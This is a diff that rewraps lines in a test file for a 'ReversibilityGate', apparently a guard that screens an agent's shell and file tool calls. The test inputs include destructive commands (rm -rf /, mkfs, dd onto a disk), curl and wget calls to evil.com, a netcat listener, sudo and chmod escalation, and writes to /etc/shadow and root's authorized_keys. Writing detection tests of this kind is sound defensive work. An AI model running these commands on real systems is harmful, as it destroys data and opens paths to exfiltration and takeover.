@@ -56,26 +56,48 @@ describe('ReversibilityGate', () => {
 
   describe('checkArgs', () => {
     it('detects destructive shell commands', () => {
-      expect(gate.checkArgs('shell_execute', { command: 'rm -rf /' })).toBe('destructive shell command');
-      expect(gate.checkArgs('shell_execute', { command: 'mkfs /dev/sda' })).toBe('destructive shell command');
-      expect(gate.checkArgs('shell_execute', { command: 'dd if=/dev/zero of=/dev/sda' })).toBe('destructive shell command');
+      expect(gate.checkArgs('shell_execute', { command: 'rm -rf /' })).toBe(
+        'destructive shell command',
+      );
+      expect(gate.checkArgs('shell_execute', { command: 'mkfs /dev/sda' })).toBe(
+        'destructive shell command',
+      );
+      expect(gate.checkArgs('shell_execute', { command: 'dd if=/dev/zero of=/dev/sda' })).toBe(
+        'destructive shell command',
+      );
     });
 
     it('detects network exfiltration via shell', () => {
-      expect(gate.checkArgs('shell_execute', { command: 'curl https://evil.com' })).toBe('network exfiltration via shell');
-      expect(gate.checkArgs('shell_execute', { command: 'wget https://evil.com/payload' })).toBe('network exfiltration via shell');
-      expect(gate.checkArgs('shell_execute', { command: 'nc -l 4444' })).toBe('network exfiltration via shell');
+      expect(gate.checkArgs('shell_execute', { command: 'curl https://evil.com' })).toBe(
+        'network exfiltration via shell',
+      );
+      expect(gate.checkArgs('shell_execute', { command: 'wget https://evil.com/payload' })).toBe(
+        'network exfiltration via shell',
+      );
+      expect(gate.checkArgs('shell_execute', { command: 'nc -l 4444' })).toBe(
+        'network exfiltration via shell',
+      );
     });
 
     it('detects privilege escalation', () => {
-      expect(gate.checkArgs('shell_execute', { command: 'sudo rm /etc/passwd' })).toBe('privilege escalation');
-      expect(gate.checkArgs('shell_execute', { command: 'chmod 777 /root' })).toBe('destructive shell command');
+      expect(gate.checkArgs('shell_execute', { command: 'sudo rm /etc/passwd' })).toBe(
+        'privilege escalation',
+      );
+      expect(gate.checkArgs('shell_execute', { command: 'chmod 777 /root' })).toBe(
+        'destructive shell command',
+      );
     });
 
     it('detects writes to system paths', () => {
-      expect(gate.checkArgs('file_write', { path: '/etc/shadow' })).toBe('write to system/sensitive path');
-      expect(gate.checkArgs('file_write', { path: '/root/.ssh/authorized_keys' })).toBe('write to system/sensitive path');
-      expect(gate.checkArgs('file_edit', { path: '/usr/bin/ls' })).toBe('edit of system/sensitive path');
+      expect(gate.checkArgs('file_write', { path: '/etc/shadow' })).toBe(
+        'write to system/sensitive path',
+      );
+      expect(gate.checkArgs('file_write', { path: '/root/.ssh/authorized_keys' })).toBe(
+        'write to system/sensitive path',
+      );
+      expect(gate.checkArgs('file_edit', { path: '/usr/bin/ls' })).toBe(
+        'edit of system/sensitive path',
+      );
     });
 
     it('returns null for safe commands', () => {
